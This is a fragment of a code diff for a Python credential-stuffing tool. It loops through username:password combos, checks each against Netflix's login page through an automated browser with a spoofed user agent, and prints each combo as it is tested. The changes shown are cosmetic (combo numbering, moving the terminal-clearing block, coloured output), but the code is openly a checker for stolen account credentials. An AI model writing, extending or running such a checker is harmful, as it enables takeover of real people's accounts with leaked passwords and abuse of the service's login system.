@@ -58,12 +58,9 @@ page = "https://www.netflix.com/login"
 
 while counter < len(user):
 	try:
-		print("\033[38;5;7mConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo:\033[38;5;190m {}:{} \033[38;5;7m|".format(user[counter], passw[counter].strip()),end='')	
+		print("\033[38;5;7mConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m|".format(str(counter), user[counter], passw[counter].strip()),end='')	
 		#Clear Terminal after n accounts
-		if clear_page > 10:
-			title()
-			print_ip_and_country()
-			clear_page = 0
+
 		#Account Checker
 		browser_options = Options()
 		browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
@@ -100,6 +97,11 @@ while counter < len(user):
 		
 		if len(updated_list) > 1:
 			del updated_list[0]
+			
+		if clear_page > 10:
+			title()
+			print_ip_and_country()
+			clear_page = 0
 		time.sleep(1)
 		counter += 1
 		clear_page += 1
@@ -114,6 +116,6 @@ while counter < len(user):
 			resume.close()
 			exit()
 		
-print("\nAll done.")
+print("\n\033[38;5;226mAll done.")
 if resume_flag == True:
 	os.remove('resume')
